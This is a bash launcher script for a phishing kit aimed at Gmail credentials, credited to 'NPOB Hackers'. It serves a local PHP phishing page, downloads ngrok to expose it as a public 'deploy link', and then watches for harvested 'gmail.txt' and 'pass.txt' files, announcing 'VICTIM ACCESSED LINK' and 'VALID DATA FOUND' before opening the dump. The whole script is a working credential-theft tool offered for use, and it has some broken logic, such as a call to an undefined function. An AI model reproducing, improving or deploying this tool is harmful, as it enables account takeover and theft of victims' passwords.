#SCRIPT BY NPOB HACKERS
#YOU CAN CHNAGE CREDITS BUT STILL YOU ARE KIDDO
#GIVE CREDITS IF YOU ARE CODER
#CHANGING CREDITS IS EASY BUT CODING IS TALENT
#THANKS TO ALL MY SUBSCRIBERS
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

checkfound() {

printf "\n"
printf "\e[1;92m\e[0m\e[1;96m|---------------------------------------------------------------|\e[0m\n"
printf "         \e[1;92m\e[1;77m\e[0m\e[1;96m |\e[96m WAITING FOR DATA LOGS,\e[0m\e[1;91m PRESS CTRL+C TO STOP \e[96m|\e[0m\n"
printf "\e[1;92m\e[0m\e[1;96m|---------------------------------------------------------------|\e[0m\n"
while [ true ]; do


if [[ -e "gmail.txt" ]]; then
printf "        \n\e[1;96m[\e[92m+>\e[1;96m] VICTIM ACCESSED LINK...!\e[0m\n"
printf "\e[1;92m\e[0m\e[1;96m |-------------------------------------[\e[92mSUCCESS\e[96m]\e[0m\n"
fi

sleep 3.5

if [[ -e "pass.txt" ]]; then
printf "         \n\e[1;96m[\e[92m+>\e[1;96m] VALID DATA FOUND...!\e[0m\n"
printf "\e[1;92m\e[0m\e[1;96m |-------------------------------------[\e[92mSUCCESS\e[96m]\e[0m\n"
printf " \e[1;92m\e[0m\e[1;96m|                                                          \e[0m\n"
sleep 3.0
printf " \e[1;92m\e[0m\e[1;96m|---------------[\e[92mOPENING DUMP\e[96m]\e[0m\n"
sleep 10.0
bash io.sh
fi
sleep 3.0
done 

}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "                 \e[1;96m[\e[0m#\e[1;96m] DOWNLOADING NGROK ...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "              \e[1;96m[!] Download error... Termux, run:\e[0m\e[1;96m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "                \e[1;96m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
printf " \e[1;92m\e[0m\e[1;96m ____[\e[92monline\e[96m]                                                 \e[0m\n"
printf " \e[1;92m\e[0m\e[1;96m|                                                             \e[0m\n"
printf "\e[1;96m[\e[92m+\e[1;96m] STARTING DATA SERVER ....\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 4
printf " \e[1;92m\e[0m\e[1;96m|                                                             \e[0m\n"
printf "\e[1;96m[\e[92m+\e[1;96m] STARTING DEPLOY SERVER....\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[1;92m\e[0m\e[1;96m|                                                             \e[0m\n"
printf " \e[1;92m\e[0m\e[1;96m|-------------------------------------------------------------|\e[0m\n"
printf "\e[1;96m[\e[92m+>\e[1;96m  DEPLOY LINK \e[93m==> \e[0m\e[1;92m %s\e[0m\n" $link
printf " \e[1;92m\e[0m\e[1;96m|-------------------------------------------------------------|\e[0m\n"
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
echo -e "\e[96m
                ____  ____  ____  __     __  _  _ 
               (    \(  __)(  _ \(  )   /  \( \/ )
                ) D ( ) _)  ) __// (_/\(  O ))  /" 
echo -e "\e[91m               (____/(____)(__)  \____/ \__/(__/\e[0m"
echo
default_option_server="2"
read -p $'\n\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;96m] START ATTACK: \e[0m' option_server
clear
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "This Server No More Supported So, Aborting."; exit 1; }
start

elif [[ $option_server -eq ok ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


start() {

default_choose_sub="Y"
default_subdomain="mrphish$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
checkfound

}

dependencies
start1

